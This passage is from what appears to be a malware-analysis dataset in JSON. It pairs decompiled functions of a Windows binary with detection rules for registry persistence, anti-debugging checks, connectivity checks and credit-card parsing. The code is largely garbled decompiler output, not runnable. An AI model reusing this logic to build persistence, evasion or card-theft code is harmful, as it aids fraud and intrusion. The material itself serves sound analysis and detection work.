        "decompiled_code": "\nuint __cdecl fcn.004041c0(char *arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    uchar var_264h;\n    uint var_263h;\n    char var_160h;\n    uint var_15fh;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    char *var_20h;\n    char *var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar2 = _sym.imp.MSVCRT.dll_sprintf;\n    var_264h = 0;\n    puVar5 = &var_263h;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_160h = '\\0';\n    puVar5 = &var_15fh;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_ch = 1;\n    var_4h = 0;\n    var_8h = 1;\n    (*_sym.imp.MSVCRT.dll_sprintf)(&var_160h, 0x40709c, arg_8h);\n    (*pcVar2)(&var_264h, 0x4070b4, arg_8h);\n    pcVar2 = _sym.imp.SHLWAPI.dll_SHSetValueA;\n    var_20h = &var_160h;\n    var_18h = &var_ch;\n    var_14h = &var_4h;\n    var_10h = &var_8h;\n    uVar4 = 0xffffffff;\n    pcVar6 = &var_160h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    var_48h = ~uVar4 - 1;\n    uVar4 = 0xffffffff;\n    pcVar6 = arg_8h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    var_34h = 0x4070dc;\n    var_30h = 0x4070e8;\n    var_2ch = 0x4070f4;\n    var_28h = 0x407104;\n    var_24h = 0x40710c;\n    var_5ch = 2;\n    var_58h = 1;\n    var_54h = 4;\n    var_50h = 4;\n    var_4ch = 4;\n    var_1ch = arg_8h;\n    var_44h = ~uVar4 - 1;\n    var_40h = 4;\n    var_3ch = 4;\n    var_38h = 4;\n    if ((arg_ch != 0) < 5) {\n        uVar4 = (arg_ch != 0) * 4;\n        do {\n            iVar3 = (*pcVar2)(0x80000002, &var_264h, *(&var_34h + uVar4), *(&var_5ch + uVar4), *(&var_20h + uVar4), \n                              *(&var_48h + uVar4));\n            if (iVar3 != 0) {\n                return 0;\n            }\n            uVar4 = uVar4 + 4;\n        } while (uVar4 < 0x14);\n    }\n    return 1;\n}\n",
        "token_count": 1094
    },
    "00401a40": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498",
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401a91) overlaps instruction at (ram,0x00401a8e)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nint32_t __cdecl fcn.00401a40(uint32_t arg_8h, uint32_t *arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    bool bVar2;\n    bool in_OF;\n    \n    if ((!in_OF) && (in_OF)) {\n        LOCK();\n    }\n    bVar2 = false;\n    if (arg_10h != 0) {\n        do {\n            if ((bVar2) || (!bVar2)) {\n                uVar1 = *arg_ch;\n            }\n            else {\n                arg_10h = arg_10h ^ *(arg_10h + 0xe58be73);\n                uVar1 = *arg_ch;\n            }\n            arg_8h = arg_8h + uVar1;\n            if (arg_8h >> 0x10 != 0) {\n                arg_8h = (arg_8h >> 0x10) + (arg_8h & 0xffff);\n            }\n            bVar2 = 0xfffffffd < arg_ch;\n            arg_ch = arg_ch + 2;\n            arg_10h = arg_10h - 1;\n        } while (arg_10h != 0);\n    }\n    return (arg_8h >> 0x10) + arg_8h;\n}\n",
        "token_count": 338
    },
    "00404360": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040448e) overlaps instruction at (ram,0x00404489)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid fcn.00404360(uint param_1, int32_t param_2, uint param_3, uint32_t *param_4)\n\n{\n    uint32_t uVar1;\n    uint16_t uVar2;\n    uchar *puVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uchar *puVar6;\n    bool bVar7;\n    unkbyte6 Var8;\n    \n    uVar2 = fcn.00401a40(0, param_1, param_2 + 1U >> 1);\n    Var8 = (*_sym.imp.dbghelp.dll_ImageNtHeader)();\n    iVar4 = Var8;\n    uVar1 = *(iVar4 + 0x58);\n    if (uVar2 < uVar1) {\n        puVar6 = (uVar2 - uVar1 & 0xffff) - 1;\n    }\n    else {\n        puVar6 = uVar2 - (uVar1 & 0xffff);\n    }\n    puVar3 = uVar1 >> 0x10;\n    if (puVar6 < uVar1 >> 0x10) {\n        iVar5 = (puVar6 - puVar3 & 0xffffU) - 1;\n    }\n    else {\n        iVar5 = puVar6 - puVar3;\n        puVar3 = puVar6;\n    }\n    if ((iVar5 != 0) && (iVar5 == 0)) {\n        out(*puVar3, Var8 >> 0x20);\n    }\n    bVar7 = (POPCOUNT(iVar5 + param_2 & 0xff) & 1U) != 0;\n    *param_4 = iVar5 + param_2;\n    puVar6 = &stack0xfffffffc;\n    if ((bVar7) && (puVar6 = &stack0xfffffffc,  !bVar7)) {\n        iVar4 = param_2 + 1;\n        puVar6 = *0x8b17b43a + 1;\n    }\n    **(puVar6 + 0x10) = *(iVar4 + 0x58);\n    return;\n}\n",
        "token_count": 516
    },
    "00402470": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402611) overlaps instruction at (ram,0x00402610)\n// \n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00402470(void)\n\n{\n    uint uVar1;\n    uchar *puVar2;\n    uchar *puVar3;\n    code *pcVar4;\n    code *pcVar5;\n    ushort uVar6;\n    int32_t iVar7;\n    char *pcVar8;\n    uchar *puVar9;\n    uint8_t extraout_CH;\n    int32_t extraout_ECX;\n    int32_t iVar10;\n    char extraout_DH;\n    ushort extraout_DX;\n    char *unaff_EBX;\n    code *pcVar11;\n    uint32_t uVar12;\n    uchar *puVar13;\n    uchar *puVar14;\n    uchar *puVar15;\n    uchar *puVar16;\n    uchar *puVar17;\n    uchar *puVar18;\n    uchar *puVar19;\n    uint *puVar20;\n    uchar *puVar21;\n    int32_t unaff_ESI;\n    char **unaff_EDI;\n    uint *puVar22;\n    uint *puVar23;\n    bool bVar24;\n    unkbyte6 Var25;\n    uchar var_260h;\n    uint var_25fh;\n    uchar s;\n    uint var_15bh;\n    uint var_58h;\n    uint var_2ch;\n    uint var_28h;\n    uchar *var_14h;\n    uint hProcess;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00404df0();\n    iVar7 = fcn.00401c20();\n    if (iVar7 != 0) {\n        if ((iVar7 < 0) || (iVar10 = extraout_ECX,  iVar7 >= 0)) {\n            iVar10 = 0x40;\n            unaff_EDI = &fcn.00402470::var_25fh;\n        }\n        uVar12 = &stack0xfffffd90 ^ *(unaff_EBX + -0x47);\n        pcVar8 = unaff_ESI + 1;\n        *pcVar8 = *pcVar8 + pcVar8;\n        *unaff_EBX = *unaff_EBX + extraout_DH;\n        var_260h = 0;\n        for (; iVar10 != 0; iVar10 = iVar10 + -1) {\n            *unaff_EDI = pcVar8;\n            unaff_EDI = unaff_EDI + 1;\n        }\n        *unaff_EDI = pcVar8;\n        *(unaff_EDI + 2) = pcVar8;\n        *(uVar12 - 4) = 0;\n        *(uVar12 - 8) = 0x26;\n        *(uVar12 - 0xc) = &stack0xfffffd9c;\n        *(uVar12 - 0x10) = 0;\n        pcVar5 = _sym.imp.SHELL32.dll_SHGetSpecialFolderPathA;\n        puVar13 = uVar12 - 0x14;\n        *(uVar12 - 0x14) = 0x4024fc;\n        iVar7 = (*pcVar5)();\n        if (iVar7 != 0) {\n            *(puVar13 + -4) = unaff_EBX;\n            *(puVar13 + -4) = 0x40251f;\n            fcn.00402a40();\n            s = 0;\n            puVar23 = &fcn.00402470::var_15bh;\n            for (iVar7 = 0x40; iVar7 != 0; iVar7 = iVar7 + -1) {\n                *puVar23 = 0;\n                puVar23 = puVar23 + 1;\n            }\n            *puVar23 = 0;\n            *(puVar23 + 2) = 0;\n            *(puVar13 + -4) = 0;\n            *(puVar13 + -4) = 3;\n            *(puVar13 + -8) = 0x40739c;\n            *(puVar13 + -0xc) = &stack0xfffffd9c;\n            *(puVar13 + -0x10) = 0x4073bc;\n            *(puVar13 + -0x14) = &stack0xfffffea0;\n            pcVar5 = _sym.imp.MSVCRT.dll_sprintf;\n            puVar14 = puVar13 + -0x18;\n            *(puVar13 + -0x18) = 0x402570;\n            (*pcVar5)();\n            pcVar5 = _sym.imp.KERNEL32.dll_Sleep;\n            puVar15 = puVar14 + 0x14;\n            var_14h = NULL;\n            pcVar11 = _sym.imp.USER32.dll_EnumWindows;\n            do {\n                puVar23 = &fcn.00402470::var_58h;\n                for (iVar7 = 0x11; iVar7 != 0; iVar7 = iVar7 + -1) {\n                    *puVar23 = 0;\n                    puVar23 = puVar23 + 1;\n                }\n                var_28h._0_2_ = 0;\n                hProcess = 0;\n                var_ch = 0;\n                var_58h = 0x44;\n                var_8h = 0;\n                var_2ch = 1;\n                var_4h = 0;\n                *(puVar15 + -4) = 0;\n                *(puVar15 + -4) = &fcn.00402470::hProcess;\n                *(puVar15 + -8) = &fcn.00402470::var_58h;\n                *(puVar15 + -0xc) = 0;\n                *(puVar15 + -0x10) = 0;\n                *(puVar15 + -0x14) = 0;\n                *(puVar15 + -0x18) = 0;\n                *(puVar15 + -0x1c) = 0;\n                *(puVar15 + -0x20) = 0;\n                *(puVar15 + -0x24) = &stack0xfffffea0;\n                *(puVar15 + -0x28) = 0;\n                pcVar4 = _sym.imp.KERNEL32.dll_CreateProcessA;\n                puVar16 = puVar15 + -0x2c;\n                *(puVar15 + -0x2c) = 0x4025eb;\n                Var25 = (*pcVar4)();\n                puVar9 = Var25;\n                bVar24 = puVar9 == NULL;\n                if (bVar24) {\n                    return;\n                }\n                if (bVar24) {\ncode_r0x00402611:\n                    *(puVar16 + -4) = 3000;\n                    puVar17 = puVar16 + -8;\n                    *(puVar16 + -8) = 0x402618;\n                    (*pcVar5)();\ncode_r0x00402618:\n                    *(puVar17 + -4) = var_8h;\n                    *(puVar17 + -8) = fcn.00402360;\n                    puVar18 = puVar17 + -0xc;\n                    *(puVar17 + -0xc) = 0x402623;\n                    uVar6 = (*pcVar11)();\n                    *(puVar18 + -4) = puVar23;\n                    *(puVar18 + -6) = uVar6;\n                    *(puVar18 + -8) = extraout_DX;\n                    *(puVar18 + -4) = 1000;\n                    *(puVar18 + -8) = hProcess;\n                    pcVar4 = _sym.imp.KERNEL32.dll_WaitForSingleObject;\n                    puVar19 = puVar18 + -0xc;\n                    *(puVar18 + -0xc) = 0x402649;\n                    iVar7 = (*pcVar4)();\n                    if (iVar7 == 0x102) {\n                        *(puVar19 + -4) = 1;\n                        *(puVar19 + -8) = hProcess;\n                        pcVar4 = _sym.imp.KERNEL32.dll_TerminateProcess;\n                        puVar20 = puVar19 + -0xc;\n                        puVar19 = puVar19 + -0xc;\n                        *puVar20 = 0x40265c;\n                        iVar7 = (*pcVar4)();\n                    }\n                    *(puVar19 + -4) = iVar7;\n                    pcVar4 = _sym.imp.KERNEL32.dll_CloseHandle;\n                    *(puVar19 + -4) = var_ch;\n                    puVar21 = puVar19 + -8;\n                    *(puVar19 + -8) = 0x40266e;\n                    (*pcVar4)();\n                    *(puVar21 + -4) = hProcess;\n                    puVar15 = puVar21 + -8;\n                    *(puVar21 + -8) = 0x402674;\n                    (*pcVar4)();\n                    puVar9 = var_14h + 1;\n                    puVar2 = var_14h;\n                    puVar3 = puVar9;\n                }\n                else {\n                    *(puVar16 + -4) = puVar23;\n                    puVar22 = *(puVar16 + -4);\n                    puVar23 = puVar22;\n                    if (!bVar24) goto code_r0x00402611;\n                    puVar23 = puVar22 + 1;\n                    uVar1 = in(Var25 >> 0x20);\n                    *puVar22 = uVar1;\n                    puVar15 = puVar16 + -1;\n                    puVar17 = puVar16 + -1;\n                    puVar2 = puVar16 + -1;\n                    puVar3 = puVar16;\n                    if (0 < puVar16) {\n                        *0xdedfffc8 = *0xdedfffc8 ^ extraout_CH;\n                        pcVar11 = pcVar11 & 0xffff0000 | CONCAT11((pcVar11 >> 8) * '\\x02', pcVar11);\n                        goto code_r0x00402618;\n                    }\n                }\n                var_14h = puVar9;\n            } while (SBORROW4(puVar3, 1) != puVar2 < 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 2274
    },
    "00403710": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nbool __cdecl fcn.00403710(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    uint arg_ch_00;\n    uint arg_ch_01;\n    uint arg_ch_02;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_314h;\n    uint var_210h;\n    uchar lpBuffer;\n    uint var_10bh;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    lpBuffer = 0;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    fcn.00402a40();\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    var_4h = 0;\n    do {\n        arg_ch_00 = fcn.004034f0();\n        arg_ch_01 = fcn.004034f0();\n        arg_ch_02 = fcn.004034f0();\n        fcn.004019e0(arg_10h, arg_ch_00);\n        fcn.004019e0(arg_8h, arg_ch_01);\n        fcn.004019e0(arg_ch, arg_ch_02);\n        pcVar1 = _sym.imp.MSVCRT.dll_sprintf;\n        (*_sym.imp.MSVCRT.dll_sprintf)(&var_314h, 0x407034, &lpBuffer, arg_10h);\n        iVar2 = fcn.004018f0(&var_314h);\n        if (iVar2 != 0) {\n            (*pcVar1)(&var_210h, 0x407040, &lpBuffer, arg_8h);\n            iVar2 = fcn.004018f0(&var_210h);\n            if (iVar2 != 0) {\n                (*pcVar1)(&var_210h, 0x407040, &lpBuffer, arg_ch);\n                iVar2 = fcn.004018f0(&var_210h);\n                if (iVar2 != 0) {\n                    iVar2 = 1;\n                    break;\n                }\n            }\n        }\n        var_4h = var_4h + 1;\n        iVar2 = var_8h;\n    } while (var_4h < 3);\n    fcn.004019e0(arg_14h, 4);\n    return iVar2 != 0;\n}\n",
        "token_count": 631
    },
    "00402aa0": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00402c76) overlaps instruction at (ram,0x00402c75)\n// \n// WARNING: Removing unreachable block (ram,0x00402c61)\n// WARNING: Removing unreachable block (ram,0x00402c76)\n// WARNING: Removing unreachable block (ram,0x00402c80)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint8_t * __cdecl fcn.00402aa0(uint8_t *arg_8h, uint *arg_ch)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    uint16_t uVar4;\n    uint8_t *puVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint32_t in_ECX;\n    uint32_t in_EDX;\n    uint32_t *puVar8;\n    int32_t unaff_EBX;\n    uchar *unaff_ESI;\n    uint32_t *puVar9;\n    uchar *puVar10;\n    char *pcVar11;\n    uint16_t in_ES;\n    bool in_CF;\n    uint8_t in_AF;\n    bool in_ZF;\n    bool bVar12;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uchar uVar13;\n    uint8_t in_NT;\n    unkbyte10 in_ST0;\n    unkbyte10 in_ST1;\n    ulong uVar14;\n    uint16_t uStackY32;\n    uint16_t uStack20;\n    \n    if ((!in_CF && !in_ZF) && (in_CF || in_ZF)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    *arg_8h = 0x61;\n    uStackY32 = unaff_EBX;\n    uVar7 = in_ECX & 0xffff0000 | CONCAT11((in_ECX >> 8) - unaff_EBX, in_ECX);\n    puVar8 = CONCAT31(in_EDX >> 8, 0x71);\n    arg_8h[1] = 0x71;\n    puVar5 = arg_8h;\n    puVar10 = unaff_ESI;\n    if ((uVar7 != in_EDX) && (uVar7 == in_EDX)) {\n        puVar5 = arg_8h & 0xffffff00 | *0x4bb148d3;\n        puVar10 = unaff_ESI + 1;\n        out(*unaff_ESI, puVar8);\n    }\n    arg_8h[2] = 0x8a;\n    uStack20 = puVar5;\n    bVar12 = unaff_EBX + 1 < 0;\n    arg_8h[3] = 0x52;\n    if ((SCARRY4(unaff_EBX, 1) == bVar12) && (SCARRY4(unaff_EBX, 1) != bVar12)) {\n        *(puVar5 + -0x7ce92414) = in_ST0;\n        uVar2 = puVar5 + -1;\n        in_AF = 9 < (uVar2 & 0xf) | in_AF;\n        uVar2 = uVar2 + in_AF * '\\x06';\n        *puVar8 = *puVar8 + 0x47c6df84;\n        puVar5 = puVar5 + -1 & 0xffffff00 |\n                 (uVar2 + (0x90 < (uVar2 & 0xf0) | uVar7 < in_EDX | in_AF * (0xf9 < uVar2)) * '`') - 0x12;\n        in_ST0 = in_ST1;\n        uStack20 = uStackY32;\n    }\n    else {\n        arg_8h[4] = 0xee;\n    }\n    uVar14 = CONCAT44(puVar8, puVar5);\n    puVar9 = puVar10 | 0x561b;\n    bVar12 = puVar9 < puVar8;\n    uVar13 = SBORROW4(puVar9, puVar8);\n    arg_8h[5] = 0xb1;\n    uVar2 = puVar5;\n    if ((!bVar12) && (bVar12)) {\n        cVar1 = uVar2 - *arg_8h;\n        func_0x10188aca((in_NT & 1) * 0x4000 | SBORROW1(uVar2, *arg_8h) * 0x800 | (in_IF & 1) * 0x200 |\n                        (in_TF & 1) * 0x100 | (cVar1 < '\\0') * 0x80 | (cVar1 == '\\0') * 0x40 | (in_AF & 1) * 0x10 |\n                        ((POPCOUNT(cVar1) & 1U) == 0) * 4 | uVar2 < *arg_8h);\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    arg_8h[6] = 0x53;\n    if (((puVar9 < puVar8) || (puVar8 <= puVar9)) && (arg_8h[7] = 0x9a,  bVar12)) {\ncode_r0x00402b8d:\n        uVar7 = uVar14;\n        arg_8h[8] = uVar14 >> 0x20;\n        puVar5 = arg_8h;\n        if (uVar13) goto code_r0x00402bb3;\n    }\n    else {\n        *(puVar5 + -0x7ce92414) = in_ST0;\n        uVar2 = 9 < (uVar2 - 1 & 0xf) | in_AF;\n        bVar12 = 0xb839207b < *puVar8;\n        uVar13 = SCARRY4(*puVar8, 0x47c6df84);\n        *puVar8 = *puVar8 + 0x47c6df84;\n        in_ES = uStackY32;\n        uVar14 = func_0x57661672();\n        if (!bVar12) goto code_r0x00402b8d;\n        uVar3 = uVar14;\n        cVar1 = uVar3 - *arg_8h;\n        puVar10 = puVar10 + -1;\n        iVar6 = func_0x10188aff((in_NT & 1) * 0x4000 | SBORROW1(uVar3, *arg_8h) * 0x800 | (in_IF & 1) * 0x200 |\n                                (in_TF & 1) * 0x100 | (cVar1 < '\\0') * 0x80 | (cVar1 == '\\0') * 0x40 |\n                                (uVar2 & 1) * 0x10 | ((POPCOUNT(cVar1) & 1U) == 0) * 4 | uVar3 < *arg_8h);\n        uVar7 = iVar6 + 0x9a000000;\n        uVar13 = SBORROW4(iVar6, 0x66000000) != false;\n        uStack20 = iVar6 + -0x7ff0f7a9 >> 0x10;\n        puVar5 = arg_8h + 1;\n    }\n    if (uVar13) {\n        LOCK();\n        puVar10 = 0x138b2633;\n        uVar13 = SCARRY4(uVar7, 0x658f517f);\n        uVar7 = uVar7 + 0x658f517f;\n    }\ncode_r0x00402bb3:\n    puVar5[9] = 0x5a;\n    if ((!uVar13) && (uVar13)) {\n        LOCK();\n        puVar10 = 0x138b2633;\n        uVar7 = uVar7 + 0x658f517f;\n    }\n    puVar5[10] = 9;\n    uVar7 = uVar7 & 0xffff;\n    puVar5[0xb] = 0xaa;\n    uVar4 = uVar7;\n    bVar12 = -1 < (uVar4 + uStackY32 | 0x11a9);\n    puVar5[0xc] = 0xe8;\n    if ((bVar12) && (!bVar12)) {\n        puVar10 = puVar10 + -1;\n        pcVar11 = puVar5 | &stack0xfffffffc;\n        puVar5 = pcVar11 + 1;\n        *pcVar11 = uVar7;\n        uVar4 = uVar7 + (uVar7 >> 8) * 'y';\n        uStack20 = in_ES;\n    }\n    puVar5[0xd] = 0x3b;\n    bVar12 = (uVar4 & 0x11cb) == 0;\n    arg_8h[0xe] = 200;\n    if ((!bVar12) && (bVar12)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    arg_8h[0xf] = 0x81;\n    arg_8h[0x10] = 0x69;\n    arg_8h[0x11] = 0xeb;\n    bVar12 = (uStack20 & 0x66) == 0;\n    arg_8h[0x12] = 0x61;\n    if ((!bVar12) && (bVar12)) {\n        arg_8h = arg_8h & 0xe2f4cc58;\n        bVar12 = arg_8h == NULL;\n    }\n    arg_8h[0x13] = 0xfa;\n    if ((!bVar12) && (bVar12)) {\n        arg_8h = arg_8h & 0xffffff00 | *0x4bb148d3;\n        out(*puVar10, uStack20);\n    }\n    arg_8h[0x14] = 0x6f;\n    *arg_ch = 0x15;\n    return arg_8h;\n}\n",
        "token_count": 2299
    },
    "00402d70": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00402e2b) overlaps instruction at (ram,0x00402e28)\n// \n// WARNING: Unable to track spacebase fully for stack\n\nuint __fastcall\nfcn.00402d70(uint param_1, int32_t param_2, uint param_3, uint param_4, uint param_5, uint param_6, uint param_7)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    uint8_t uVar3;\n    code *pcVar4;\n    uint32_t *puVar5;\n    uint extraout_ECX;\n    int32_t iVar6;\n    int32_t extraout_ECX_00;\n    uint extraout_ECX_01;\n    uint uVar7;\n    int32_t unaff_EBX;\n    int32_t iVar8;\n    uint32_t **ppuVar9;\n    uint32_t **ppuVar10;\n    uint *puVar12;\n    uint32_t unaff_ESI;\n    uint32_t *puVar13;\n    uint *puVar14;\n    uint8_t *puVar15;\n    uint32_t *puVar16;\n    bool bVar17;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    ulong uVar18;\n    uint8_t in_stack_f88bdc71;\n    uchar uStack40;\n    uint uStack39;\n    uint32_t *puStack8;\n    uint *puVar11;\n    \n    ppuVar9 = &stack0xffffffc8 ^ *(unaff_EBX + -0x75);\n    *(param_2 + 7) = (*(param_2 + 7) - (param_7 >> 8)) - (unaff_ESI < 0x8b);\n    ppuVar9[-1] = 0x407064;\n    ppuVar9[-2] = unaff_ESI & 0xffffff00 | unaff_ESI + 0x75;\n    ppuVar9[-3] = param_7;\n    ppuVar9[-4] = 0x402dd7;\n    uVar18 = fcn.004038d0(ppuVar9[-3], ppuVar9[-2], ppuVar9[-1], *ppuVar9);\n    uVar7 = uVar18 >> 0x20;\n    puStack8 = uVar18;\n    if (puStack8 == NULL) {\n        return 0;\n    }\n    *ppuVar9 = puStack8;\n    ppuVar9[-1] = unaff_EBX;\n    ppuVar9[-2] = extraout_ECX;\n    pcVar4 = _sym.imp.MSVCRT.dll_rand;\n    iVar8 = ppuVar9[-1];\n    ppuVar10 = ppuVar9 + 1;\n    uStack40 = 0;\n    puVar14 = &stack0xffffffd9;\n    for (iVar6 = 7; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar14 = 0;\n        puVar14 = puVar14 + 1;\n    }\n    *puVar14 = 0;\n    *(puVar14 + 2) = 0;\n    puVar16 = NULL;\n    do {\n        puVar13 = puVar16;\n        *(ppuVar10 + -4) = iVar8;\n        *(ppuVar10 + -6) = iVar6;\n        *(ppuVar10 + -8) = uVar7;\n        iVar8 = *(ppuVar10 + -4);\n        puVar11 = ppuVar10 + -4;\n        ppuVar10 = ppuVar10 + -4;\n        *puVar11 = 0x402e1a;\n        uVar18 = (*pcVar4)();\n        uVar7 = uVar18 >> 0x20;\n        uVar3 = uVar18;\n        (&stack0xffffffd8)[puVar13] = uVar3;\n        bVar17 = puVar13 + 1 < 0x20;\n        iVar6 = extraout_ECX_00;\n        puVar16 = puVar13 + 1;\n    } while (bVar17);\n    if (!bVar17) {\n        *(ppuVar10 + -2) = pcVar4;\n        puVar15 = pcVar4 & 0xffff0000 | *(ppuVar10 + -2);\n        if (bVar17) {\n            cVar2 = uVar3 - *puVar15;\n            *(ppuVar10 + -4) =\n                 (in_NT & 1) * 0x4000 | SBORROW1(uVar3, *puVar15) * 0x800 | (in_IF & 1) * 0x200 | (in_TF & 1) * 0x100 |\n                 (cVar2 < '\\0') * 0x80 | (cVar2 == '\\0') * 0x40 | (in_AF & 1) * 0x10 | ((POPCOUNT(cVar2) & 1U) == 0) * 4\n                 | uVar3 < *puVar15 | (in_ID & 1) * 0x200000 | (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 |\n                 (in_AC & 1) * 0x40000;\n            puVar12 = ppuVar10 + -8;\n            ppuVar10 = ppuVar10 + -8;\n            *puVar12 = 0x402e44;\n            puVar5 = func_0x10188dbc();\n            iVar6 = iVar8 + 0x8b9fc45;\n            *puVar5 = *puVar5 + puVar5;\n            bVar17 = CARRY1(in_stack_f88bdc71, iVar6);\n            puVar16 = puVar15 + 1;\n            goto code_r0x00402e57;\n        }\n    }\n    iVar6 = 8;\n    puVar13 = &stack0xffffffd8;\n    puVar5 = puStack8;\n    puVar16 = puStack8;\ncode_r0x00402e57:\n    for (; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar16 = *puVar13;\n        puVar13 = puVar13 + 1;\n        puVar16 = puVar16 + 1;\n    }\n    if (!bVar17) {\n        *(ppuVar10 + -2) = puVar16;\n        puVar16 = puVar16 & 0xffff0000 | *(ppuVar10 + -2);\n        if (bVar17) {\n            puVar1 = *puVar5;\n            *(ppuVar10 + -4) = 0xb7f8c08b;\n            if (puVar1 <= ppuVar10 && puVar5 != 0xffffffff) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    }\n    *(ppuVar10 + -4) = puVar5;\n    *(ppuVar10 + -8) = 0x20;\n    *(ppuVar10 + -0xc) = &stack0xffffffd8;\n    *(ppuVar10 + -0x10) = param_6;\n    *(ppuVar10 + -0x14) = param_5;\n    *(ppuVar10 + -0x18) = param_4;\n    *(ppuVar10 + -0x1c) = param_3;\n    *(ppuVar10 + -0x20) = 0x402e9a;\n    uVar18 = fcn.00403000(*(ppuVar10 + -0x1c), *(ppuVar10 + -0x18), *(ppuVar10 + -0x14), *(ppuVar10 + -0x10), \n                          *(ppuVar10 + -0xc), *(ppuVar10 + -8), *(ppuVar10 + -4));\n    *(ppuVar10 + -4) = uVar18;\n    *(ppuVar10 + -8) = extraout_ECX_01;\n    *(ppuVar10 + -0xc) = uVar18 >> 0x20;\n    *(ppuVar10 + -0x10) = iVar8;\n    *(ppuVar10 + -0x14) = ppuVar10;\n    *(ppuVar10 + -0x18) = &stack0xfffffffc;\n    *(ppuVar10 + -0x1c) = puVar13;\n    *(ppuVar10 + -0x20) = puVar16;\n    uVar7 = *(*(ppuVar10 + -0x18) + 0x18);\n    *(ppuVar10 + -4) = *(*(ppuVar10 + -0x18) + 0x1c);\n    *(ppuVar10 + -8) = uVar7;\n    *(ppuVar10 + -0xc) = 0x402ebd;\n    fcn.00403480();\n    return 1;\n}\n",
        "token_count": 2102
    },
    "00403d70": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
